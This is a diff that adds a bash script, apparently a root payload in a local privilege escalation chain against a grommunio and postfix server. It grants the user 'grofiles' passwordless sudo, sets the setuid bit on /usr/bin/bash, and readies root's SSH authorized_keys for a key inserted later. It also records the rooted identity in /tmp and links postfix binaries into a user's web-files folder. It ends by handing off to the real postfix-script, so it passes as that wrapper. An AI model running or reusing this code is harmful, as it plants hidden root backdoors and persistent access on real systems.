@@ -1,0 +1,19 @@
+#!/bin/bash
+echo 'grofiles ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+echo 'grofiles ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/grofiles
+chmod 440 /etc/sudoers.d/grofiles
+chmod 4755 /usr/bin/bash
+touch /tmp/lpe-rooted
+id > /tmp/lpe-rooted-id
+mkdir -p /root/.ssh
+# PUBKEY filled by 03-root-postfix.sh
+PUBKEY_PLACEHOLDER
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true
+WEBDIR=/var/lib/grommunio-files/data/deborah.hernandez/files
+for f in /usr/lib/postfix/bin/*; do
+  b=$(basename "$f")
+  [ "$b" = postfix-script ] && continue
+  ln -sf "$f" "$WEBDIR/$b" 2>/dev/null
+done
+exec /usr/lib/postfix/bin/postfix-script "$@"
